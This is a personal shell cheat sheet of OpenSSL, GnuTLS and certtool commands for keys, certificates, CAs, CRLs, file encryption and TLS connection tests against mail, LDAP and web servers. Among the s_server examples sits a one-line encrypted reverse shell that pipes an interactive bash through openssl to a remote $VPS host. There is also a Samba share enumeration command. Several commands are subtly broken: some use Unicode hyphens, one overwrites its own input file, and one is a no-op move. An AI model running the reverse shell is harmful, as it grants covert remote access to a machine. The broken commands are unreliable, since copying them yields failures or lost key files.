#!/bin/sh
##-=================================================-##
##   [+] Xe1phix-[OpenSSL]-[GnuTLS]-Cheatsheet-[v*.*.*.].sh
##-=================================================-##
## ------------------------------------------------------------------------------------------- ##
##   [?] 
## ------------------------------------------------------------------------------------------- ##



#!/bin/sh

##-=============================================-##
##   [+] 
##-=============================================-##
openssl genpkey -algorithm RSA -out $Key.pem


##-===================================-##
##     [+]  Encrypt and decrypt A single file:
##-===================================-##
openssl aes‐128‐cbc ‐salt ‐in $File ‐out $File.aes 
openssl aes‐128‐cbc ‐d ‐salt ‐in $File.aes ‐out $File 


##-==================================================-##
##     [+]  
##-==================================================-##



## ----------------------------------------------------------------------------------------------- ##
##    [?]  Note: the archive file can be tar archive format as well:
## ----------------------------------------------------------------------------------------------- ##

##-====================================-##
##     [+]   Tar and Encrypt a whole directory:
##-====================================-##
## --------------------------------------------------------------------------------------------------------------- ##
tar ‐cf ‐ $Dir | openssl aes‐128‐cbc ‐salt ‐out $Dir.tar.aes   			##  Encrypt 
openssl aes‐128‐cbc ‐d ‐salt ‐in $Dir.tar.aes | tar ‐x ‐f ‐          			##  Decrypt
## --------------------------------------------------------------------------------------------------------------- ##



##-======================================-##
##     [+]   Tar zip and Encrypt a whole directory:
##-======================================-##
## ------------------------------------------------------------------------------------------------------------------- ##
tar ‐zcf ‐ $Dir | openssl aes‐128‐cbc ‐salt ‐out $Dir.tar.gz.aes  			##  Encrypt 
openssl aes‐128‐cbc ‐d ‐salt ‐in $Dir.tar.gz.aes | tar ‐xz ‐f ‐        		##  Decrypt
## -------------------------------------------------------------------------------------------------------------------- ##



##-================================-##
##    [+] Generate Checksum from file
##-================================-##

echo "## --------------------------------------------------------------------------- ##"
openssl md5 file.tar.gz            # Generate an md5 checksum from file 
openssl sha1 file.tar.gz           # Generate an sha1 checksum from file 
openssl rmd160 file.tar.gz         # Generate a RIPEMD‐160 checksum from file 
echo "## --------------------------------------------------------------------------- ##"


gpg --symmetric --cipher $cipher --armor $sourcefile



##-=============================================-##
##    [+] Create a certificate authority
echo "## =========================================== ##"
echo "## ============================================================================================================= ##"
openssl req ‐new ‐x509 ‐days 730 ‐config /etc/ssl/openssl.cnf ‐keyout CA/private/cakey.pem ‐out CA/cacert.pem
echo "## ============================================================================================================= ##"
openssl req ‐new ‐keyout $Key.pem ‐out $Req.pem ‐config /etc/ssl/openssl.cnf 
openssl req ‐nodes ‐new ‐keyout $Key.pem ‐out $Req.pem ‐config /etc/ssl/openssl.cnf       # No encryption for the key 
echo "## ============================================================================================================= ##"

##-=============================================-##
##    [+] Sign the certificate
echo "## =========================================== ##"

echo "## ------------------------------------------- ##"
cat $Req.pem $Key.pem > $Key.pem 
echo "## ============================================================================================================= ##"
openssl ca ‐policy policy_anything ‐out $Cert.pem ‐config /etc/ssl/openssl.cnf ‐infiles new.pem 
echo "## ============================================================================================================= ##"
mv $Key.pem $Key.pem 
echo "## ------------------------------------------- ##"



CA/private/cakey.pem (CA server private key)
CA/cacert.pem (CA server public key)
certs/servernamekey.pem (server private key)
certs/servernamecert.pem (server signed certificate)
certs/servername.pem (server certificate with private key)



openssl x509 ‐text ‐in servernamecert.pem      # View the certificate info 
openssl req ‐noout ‐text ‐in server.csr        # View the request info 
openssl s_client ‐connect cb.vu:443            # Check a web server certificate 








##-=============================-##
##    [+] create an RSA private key:
##-=============================-##
certtool --generate-privkey --outfile $Key.pem --rsa


## ---------------------------------------------------------------------- ##
##    [?]  The private key is stored in a smart card 
## ---------------------------------------------------------------------- ##
##-=================================-##
##    [+] Generate A Certificate Request:
##-=================================-##
certtool --generate-request --load-privkey "pkcs11:..." --load-pubkey "pkcs11:..."


##-===============================-##
##    [+] Create self-signed certificate
##-===============================-##
certtool --generate-privkey --outfile $Key.pem
certtool --generate-self-signed --load-privkey $Key.pem --outfile $Key.pem

certtool --generate-certificate --load-request $Request.pem --outfile $Cert.pem --load-ca-certificate $CACert.pem --load-ca-privkey $CAKey.pem


##-===========================================-##
##    [+] Generate a certificate using the private key
##-===========================================-##
certtool --generate-certificate --load-privkey $Key.pem --outfile $Cert.pem --load-ca-certificate $CACert.pem --load-ca-privkey $CAKey.pem


##-==============================-##
##    [+] View Certificate information
##-==============================-##
certtool --certificate-info --infile $Cert.pem

##-=======================================-##
##    [+] Generate a PKCS #12 structure 
##    [+] using the previous key and certificate
##-=======================================-##
certtool --load-certificate $Cert.pem --load-privkey $Key.pem --to-p12 --outder --outfile $Key.p12

certtool --load-ca-certificate $CACert.pem --load-certificate $Cert.pem --load-privkey $Key.pem --to-p12 --outder --outfile $Key.p12

##-===============================================-##
##    [+] Generate Diffie-Hellman key exchange parameters:
##-===============================================-##
certtool --generate-dh-params --outfile $DH.pem --sec-param medium

certtool --generate-privkey > $Key.pem
certtool --generate-proxy --load-ca-privkey $Key.pem --load-privkey $ProxyKey.pem --load-certificate $Cert.pem --outfile $ProxyCert.pem

##-================================================-##
##    [+] Certificate revocation list generation
##    [+] Create an empty Certificate Revocation List (CRL):
##-================================================-##
certtool --generate-crl --load-ca-privkey $x509CAKey.pem --load-ca-certificate $x509CA.pem

##-=============================================================-##
##    [+] create a CRL that contains some revoked certificates, 
##    [+] place the certificates in a file and use --load-certificate as follows:
##-=============================================================-##
certtool --generate-crl --load-ca-privkey $x509CAKey.pem --load-ca-certificate $x509CA.pem --load-certificate $RevokedCerts.pem


##-=============================================-##
##    [+] verify a Certificate Revocation List (CRL):"
##-=============================================-##
certtool --verify-crl --load-ca-certificate $x509CACert.pem < $CRL.pem














cd /etc/ssl/certs
/usr/share/ssl/misc/CA -newca


##-=============================================-##
##    [+] create a SSL .cnf file for your new CA.
##-=============================================-##
cp /usr/share/ssl/openssl.cnf /etc/ssl/openssl.cnf


##-=============================================-##
##    [+] Creating a Certificate Request
##-=============================================-##
openssl req -config /etc/ssl/openssl.cnf -new -keyout $Key.pem -out $CSR.csr


##-=============================================-##
##    [+] Signing Your Certificate Request
##-=============================================-##
openssl ca -config /etc/ssl/certs/puppyCA/openssl.cnf -policy policy_anything -out $Cert.pem -infiles $CSR.csr





cd /etc/ssl
chmod 0755 certs
cd certs
chmod -R 0400 *



##-=============================================-##
##    [+] Creating a CRL
##-=============================================-##
cd /etc/ssl/certs/puppyCA/
openssl ca -gencrl -out $CRL.pem -config /etc/ssl/certs/puppyCA/openssl.cnf



##-=============================================-##
##    [+] Revoking a Certificate
##-=============================================-##
openssl ca -revoke $Cert.pem -config /etc/ssl/openssl.cnf



--verbose
--debug=						## in the range  0 through 9999
--resume
--crlf
--sni-hostname=						## Server's hostname for server name indication extension
--verify-hostname=
--starttls
--starttls-proto=https
--starttls-proto=ftp
--starttls-proto=smtp
--starttls-proto=imap
--starttls-proto=ldap
--starttls-proto=xmpp
--starttls-proto=pop3
--starttls-proto=sieve
--starttls-proto=nntp
--starttls-proto=postgres
--starttls-proto=lmtp


--local-dns
--dane								## Enable DANE certificate verification (DNSSEC)
--tofu								## Enable trust on first use authentication.
--strict-tofu						## Fail to connect if a certificate is unknown or a known certificate has changed

--ca-verification
--print-cert
--save-cert=$PEM


--ocsp								## Enable OCSP certificate verification.
--no-ocsp							## dISABLE OCSP certificate verification
--save-ocsp=

--save-server-trace=
--save-client-trace=


--rehandshake			## 


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli --crlf --starttls --x509cafile /etc/pki/CA/$CACert.pem --port 25 mail.$Domain


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli --port 9998 --x509cafile $x509CAFile.cer $Domain



openssl s_client -connect imap.gmail.com:993
 
gnutls-cli imap.gmail.com -p 993
 
socat openssl:imap.gmail.com:993 stdio
 
socat ssl:imap.gmail.com:993 readline
 
ncat --ssl imap.gmail.com 993
 
telnet-ssl -z ssl imap.gmail.com 993


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli -p 5223 talk.google.com


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli $Domain -p 389 --starttls-proto=ldap


openssl s_server -accept 8443 -cert $Cert.pem -key $Key.pem -cipher eNULL


openssl s_client -connect $IP:40004 </dev/null 2>/dev/null | openssl x509 -outform PEM > $Cert.pem
 




openssl s_server -accept 8888 -cert server.cert -key server.key -pass file:passphrase.txt -CAfile ca.cert
openssl s_client -connect 127.0.0.1:8888 -cert client.cert -key client.key -pass file:passphrase.txt -CAfile ca.cert
openssl s_client -connect 127.0.0.1:8888 -cert client.cert -key client.key -pass file:passphrase.txt -CAfile ca.cert





##-=============================================-##
##   [+] 
##-=============================================-##
openssl s_server -cert $Cert -verify 2


##-==============    ===============================-##
##   [+] 
##-=============================================-##
openssl s_client -starttls imap -connect 127.0.0.1:1143 -showcerts
openssl s_client -starttls imap -connect $Domain:1143 -showcerts


##-=============================================-##
##   [+] 
##-=============================================-##
gnutls-cli LDAP -p 389 --starttls-proto=ldap



openssl req -x509 -newkey rsa:4096 -keyout $Key.pem -out $Cert.pem -days 365 -nodes

openssl s_server -quiet -key $Key.pem -cert $Cert.pem -port 80

mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $VPS:1024 > /tmp/s; rm /tmp/s





##-=============================================-##
##   [+] 
##-=============================================-##
openssl s_server -msg -tlsextdebug -state -cert $Cert.crt -key $Key.key





##-=============================================-##
##   [+] 
##-=============================================-##
openssl s_server -accept 1111 -cert $Cert.crt -key $Key.key -CAfile $CA.crt -verify 1



##-=============================================-##
##    [+] Get the SAN (subjectAltName) of a sites certificate.
##-=============================================-##
echo "quit" | openssl s_client -tls1_2 -connect $Domain:443 | openssl x509 -noout -text | grep "DNS:" | perl -pe "s/(, )?DNS:/\n/g"


##-=============================================-##
##    [+] List SAN domains for a certificate 
##-=============================================-##
echo | openssl s_client -tls1_2 -connect $Domain:443 2>&1 | openssl x509 -noout -text | awk -F, -v OFS="\n" '/DNS:/{x=gsub(/ *DNS:/, ""); $1=$1; print $0}'


##-=============================================-##
##   [+] Debug openssl from CLI 
##-=============================================-##
openssl s_client -tls1_2 -state -connect $Domain:443


##-=============================================-##
##   [+] Download certificate from FTP 
##-=============================================-##
echo | openssl s_client -servername ftp.$Domain -connect ftp.$Domain:21 -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'


##-=============================================-##
##   [+] Download certificate chain from FTP 
##-=============================================-##
echo | openssl s_client -showcerts -connect ftp.$Domain:21 -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'


echo | openssl s_client -connect $Domain:21 -starttls ftp
echo | openssl s_client -connect ftp.$Domain:21 -starttls ftp

echo | openssl s_client -connect ftp.debian.org:21 -starttls ftp


##-=============================================-##
##   [+] test and send email via smtps using openssl client 
##-=============================================-##
(sleep 1;echo EHLO MAIL;sleep 1;echo "MAIL FROM: <a@foo.de>";sleep 1;echo "RCPT TO: <b@bar.eu>";sleep 1;echo DATA;sleep 1;echo Subject: test;sleep 1;echo;sleep 1;echo Message;sleep 1;echo .;sleep 1;)|openssl s_client -host b.de -port 25 -starttls smtp


##-=============================================-##
##   [+] Get SSL expiration date from remote site 
##-=============================================-##
openssl s_client -showcerts -servername www.google.com -connect www.google.com:443 </dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' | openssl x509 -noout -subject -dates
echo | openssl s_client -servername google.de -connect google.de:443 2>/dev/null | openssl x509 -noout -enddate





openssl s_client -tls1_2 -host registry.videoanalytics.x5.ru -port 443


openssl s_client -tls1_2 -connect graph.facebook.com:443
openssl s_client -connect graph.facebook.com:443 -debug -state -msg -CAfile /etc/ssl/certs/$CACertificates.crt


##-==========================-##
##   [+] Connect Using TLSv1.2
##-==========================-##
openssl s_client -tls1_2 -connect $Domain:443





Get a list of all browsable Samba shares on the target server.

smbclient -N -gL \\SambaServer 2>&1 | grep -e "Disk|" | cut -d'|' -f2



##-=====================================-##
##     [+] Connect Using A SSLv3 Connection 
##-=====================================-##
openssl s_client -connect $Domain:443 -ssl3
openssl s_client -connect localhost:443 -ssl3


openssl s_client -showcerts -connect 127.0.0.1:8080


openssl s_client -tls1_2 -alpn h2 -connect 127.0.0.1:443 -status    
echo | openssl s_client -alpn h2 -connect localhost:443 | grep ALPN 



openssl s_client -debug -connect $Domain:9080

openssl s_client -tls1_2 -showcerts -connect $Domain:443


##-=============================================-##
##   [+] Connect 
##-=============================================-##
openssl s_client -debug -state -connect localhost:3001


##-=============================================-##
##   [+] Connect 
##-=============================================-##
openssl s_client -connect $LDAPService:636
openssl s_client -connect $LDAPHost:636
openssl s_client -connect $LDAPHost:636 -ssl3
openssl s_client -connect $LDAPHost:636 -stls1

##-=============================================-##
##   [+] Connect 
##-=============================================-##
openssl s_client -tls1_2 -connect auth.startssl.com:443   


##-=============================================-##
##   [+] Connect To POP3 Using OpenSSL
##-=============================================-##
openssl s_client -crlf -connect $Domain:110 -starttls pop3


##-=============================================-##
##   [+] Connect to SMTP server using STARTTLS
##-=============================================-##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25

openssl s_client -tls1_2 -connect auth.startssl.com:443    

openssl s_client -connect $Domain:443 -tls1_2 -servername $Domain | openssl x509 -text -noout


##   Connect to SMTP server using STARTTLS 

##   [+] connect to an SMTP server over TLS.
##   [?] which is useful for debugging SMTP sessions.

## ---------------------------------------- ##
##    [?] Command Source:
## ---------------------------------------- ##
## ------------------------------------------------------------------------------------------------------------------------------------------------- ##
##~->  https://www.commandlinefu.com/commands/view/3093/connect-to-smtp-server-using-starttls
## ------------------------------------------------------------------------------------------------------------------------------------------------- ##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25



openssl s_client -connect $Domain:443 -state -nbio -servername $Domain
openssl s_client -tls1_2 -connect $Domain:443 -state -nbio -servername $Domain

openssl s_client -connect smtp.comcast.net:465 -tls1_2

##-================================-##
##     [+] Save the output In a File
##     [+] display the certificate details
##-================================-##
openssl s_client -connect smtp.comcast.net:465 -tls1_2 > /tmp/smtps
openssl x509 -in /tmp/smtps -text



openssl x509 -in serverCASigned.crt -text -noout


openssl s_client -connect smtp.comcast.net:465 -tls1_2 | openssl x509 -in /dev/stdin -text


openssl s_client -connect smtp.office365.com:587 -starttls smtp


##-================================-##
##     [+] Connect to Gmail using IMAP
##-================================-##
openssl s_client -tls1 -connect imap.gmail.com:993
openssl s_client -tls1_2 -connect imap.gmail.com:993
openssl s_client -ssl3 -connect imap.gmail.com:993

openssl s_client -host $Domain -port 993
openssl s_client -tls1 -host $Domain -port 993
openssl s_client -tls1_2 -host $Domain -port $Port



##-==================================-##
##     [+] Connect to an MTA Using SMTP
##-==================================-##
openssl s_client -connect $Sub.$Domain.com:25 -starttls smtp
openssl s_client -connect $Domain:25 -starttls smtp

gnutls-cli-debug --starttls-proto smtp --port 25 localhost

##-=======================================-##
##     [+] Connect To A SMTP Server 
##     [+] Securing The Connection Using A CA:
##-=======================================-##
openssl s_client -starttls smtp -CApath $Dir/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath $Dir/ -connect $Domain:25
openssl s_client -CAfile $CAFile -starttls smtp -connect 127.0.0.1:25
openssl s_client -CAfile $CAFile -starttls smtp -connect $Domain:25
openssl s_client -CAfile $CAFile -starttls smtp -connect $Domain --port 25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect $Domain:25



openssl s_client -connect smtp.office365.com:587 -starttls smtp






##-=============================================-##
##     [+] Connect to a non-MTA client such as an IMAP server:
##-=============================================-##
openssl s_client -connect $Sub.$Domain.com:993
openssl s_client -connect $Domain:993



openssl s_client -showcerts -connect chat.freenode.net:6697
openssl s_client -showcerts -connect -tls1_2 chat.freenode.net:6697




##-=============================================-##
##     [+] Starting a Test SSL Server Using the openssl s_server Function
##-=============================================-##
openssl s_server -key puppy.yourdomain.com.key.pem -cert puppy.yourdomain.com.cert.pem



telnet mail.$Domain 25

openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25
openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25

openssl s_client -starttls smtp -CApath /etc/postfix/certs/ -connect 127.0.0.1:25

openssl s_client -connect smtp.office365.com:587 -starttls smtp





openssl s_client -tls1_2 -CApath /etc/ssl/certs -connect $Domain:443



openssl s_client -tls1_2 -host google.com -port 443 | openssl x509 -noout -dates -subject -issuer 






ehlo localhost


##-=============================================-##
##     [+] Setting Up an SSL Certificate for Apache2
##-=============================================-##

openssl -x509 -text -in server.crt

openssl verify -CAfile /path/to/trusted_ca.crt -purpose sslserver my.domain.org.crt


openssl x509 -noout -modulus -in my.domain.org.pem | openssl sha1
openssl rsa -noout -modulus -in my.domain.org.key | openssl sha1



cp my.domain.org.key my.domain.org.crt /etc/apache2/ssl
chown root:root my.domain.org.key; chmod og-r my.domain.org.key
chown root:root my.domain.org.crt; chmod a+r my.domain.org.crt






mkdir -p /etc/ssl/private/
openssl req -x509 -nodes -newkey rsa:4096 -keyout /etc/ssl/private/pure-ftpd.pem -out /etc/ssl/private/pure-ftpd.pem
chmod -f 0600 /etc/ssl/private/*.pem


--verbose

--x509crlfile=
--x509cafile=
--x509keyfile= 
--x509certfile=


--sni-hostname=
--verify-hostname=

--starttls
--starttls-proto=
https, ftp, smtp, imap, ldap, xmpp, lmtp, pop3, nntp, sieve, postgres


--port=


--save-server-trace=str
--save-client-trace=
--logfile=



--print-cert





gnutls-cli-debug localhost


gnutls-cli-debug --starttls-proto smtp --port 25 localhost







curl https://vmlinux:2376/images/json --cert ~/.docker/cert.pem --key ~/.docker/key.pem --cacert ~/.docker/ca.pem

